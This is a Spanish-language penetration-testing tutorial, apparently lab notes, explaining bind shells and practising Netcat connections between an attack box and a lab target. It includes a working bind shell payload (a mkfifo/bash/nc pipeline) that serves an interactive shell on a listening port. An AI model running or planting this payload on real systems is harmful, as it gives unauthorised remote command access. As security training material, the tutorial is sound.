# Bind Shells

En muchos casos, trabajaremos para establecer una shell en un sistema en una red local o remota. Esto significa que utilizaremos la aplicación de emulación de terminal en nuestra caja de ataque local para controlar el sistema remoto a través de su shell. Esto generalmente se hace usando una shell _bind_ o _reverse_.

## Bind Shell

Con una _bind shell_, el sistema objetivo inicia un oyente (_listener_) y espera una conexión desde el sistema del pentester (la caja de ataque).

<figure><img src="../../.gitbook/assets/image (702).png" alt=""><figcaption></figcaption></figure>

### **Ejemplo de Bind Shell**

Como se muestra en la imagen, nos conectaríamos directamente con la dirección IP y el puerto que está escuchando en el objetivo. Hay varios desafíos asociados con obtener una shell de esta manera. A continuación, algunos aspectos a considerar:

* Debe haber un oyente iniciado previamente en el objetivo.
* Si no hay un oyente iniciado, tendríamos que encontrar una manera de hacerlo.
* Los administradores típicamente configuran reglas de firewall de entrada estrictas y NAT (con implementación de PAT) en el borde de la red (expuesta al público), por lo que ya tendríamos que estar en la red interna.
* Es probable que los firewalls del sistema operativo (en Windows y Linux) bloqueen la mayoría de las conexiones entrantes que no estén asociadas a aplicaciones confiables.

Los firewalls del sistema operativo pueden ser problemáticos cuando intentamos establecer una shell, ya que necesitamos tener en cuenta las direcciones IP, los puertos y la herramienta utilizada para que nuestra conexión funcione correctamente. En el ejemplo anterior, la aplicación utilizada para iniciar el oyente se llama **GNU Netcat**. **Netcat (nc)** es nuestra "navaja suiza" ya que puede funcionar sobre TCP, UDP y sockets Unix. Es capaz de utilizar IPv4 e IPv6, abrir y escuchar en sockets, operar como proxy, e incluso manejar entrada y salida de texto. Usaríamos `nc` en la caja de ataque como nuestro cliente, y el objetivo sería el servidor.

Vamos a entender más a fondo esto practicando con Netcat y estableciendo una conexión _bind shell_ con un host en la misma red sin restricciones.

## Practicando con GNU Netcat

Primero, necesitamos activar nuestra caja de ataque o **Pwnbox** y conectarnos al entorno de red de la Academia. Luego, asegurarnos de que nuestro objetivo esté iniciado. En este escenario, interactuaremos con un sistema Linux Ubuntu para comprender la naturaleza de una _bind shell_. Para hacerlo, utilizaremos **Netcat (nc)** tanto en el cliente como en el servidor.

Una vez conectados al objetivo mediante SSH, iniciaremos un oyente de Netcat:

**No. 1: Servidor - Objetivo iniciando oyente Netcat**

```bash
Target@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
```

En este caso, el objetivo será nuestro servidor, y la caja de ataque será nuestro cliente. Al presionar Enter, el oyente se inicia y espera una conexión desde el cliente.

De vuelta en el cliente (caja de ataque), utilizaremos `nc` para conectarnos al oyente que iniciamos en el servidor.

### **No. 2: Cliente - Caja de ataque conectándose al objetivo**

```bash
sherlock28@htb[/htb]$ nc -nv 10.129.41.200 7777
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

Notemos cómo estamos usando `nc` tanto en el cliente como en el servidor. En el lado del cliente, especificamos la dirección IP del servidor y el puerto que configuramos para escuchar (7777). Una vez que nos conectamos con éxito, veremos el mensaje "succeeded!" en el cliente, como se muestra arriba, y un mensaje de conexión recibida en el servidor, como se ve abajo.

### **No. 3: Servidor - Objetivo recibiendo la conexión del cliente**

```bash
Target@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!    
```

Sepamos que esto no es una shell propiamente dicha. Es solo una sesión TCP de Netcat que hemos establecido. Podemos ver su funcionalidad escribiendo un mensaje simple en el lado del cliente y viendo cómo se recibe en el servidor.

### **No. 4: Cliente - Caja de ataque enviando el mensaje "Hello Academy"**

```bash
sherlock28@htb[/htb]$ nc -nv 10.129.41.200 7777
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hello Academy  
```

Una vez que escribimos el mensaje y presionamos Enter, veremos que el mensaje es recibido en el servidor.

### **No. 5: Servidor - Objetivo recibiendo el mensaje "Hello Academy"**

```bash
Victim@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy  
```

## Estableciendo una Shell Bind Básica con Netcat

Hemos demostrado que podemos usar Netcat para enviar texto entre el cliente y el servidor, pero esto no es una _bind shell_ porque no podemos interactuar con el sistema operativo ni con el sistema de archivos. Solo podemos pasar texto a través del canal configurado por Netcat. Usemos Netcat para proveer nuestra shell y establecer una verdadera _bind shell_.

En el lado del servidor, necesitaremos especificar el directorio, shell, oyente, trabajar con algunos canales y redireccionamiento de entrada y salida para garantizar que se sirva una shell al sistema cuando el cliente intente conectarse.

### **No. 1: Servidor - Asociando una shell Bash a la sesión TCP**

```bash
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

Los comandos anteriores son considerados nuestro _payload_ y entregamos este _payload_ manualmente. Notaremos que los comandos y el código en nuestros _payloads_ variarán dependiendo del sistema operativo del host al que se los entreguemos.

De vuelta en el cliente, utilizaremos Netcat para conectarnos al servidor ahora que una shell en el servidor está siendo servida.

### **No. 2: Cliente - Conectándose a la shell&#x20;**_**bind**_**&#x20;en el objetivo**

```bash
sherlock28@htb[/htb]$ nc -nv 10.129.41.200 7777
Target@server:~$  
```

Veremos que hemos establecido con éxito una sesión de _bind shell_ con el objetivo.
